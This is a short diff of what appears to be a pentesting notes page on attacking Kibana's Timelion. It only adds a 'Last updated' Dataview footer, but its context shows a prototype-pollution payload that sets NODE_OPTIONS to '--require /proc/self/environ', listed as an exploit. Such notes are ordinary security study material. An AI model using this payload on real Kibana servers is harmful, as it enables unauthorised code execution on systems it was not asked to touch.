@@ -20,3 +20,5 @@ Left side menu > Timelion > Try one of the following 2 exploits:
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 ```
 
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
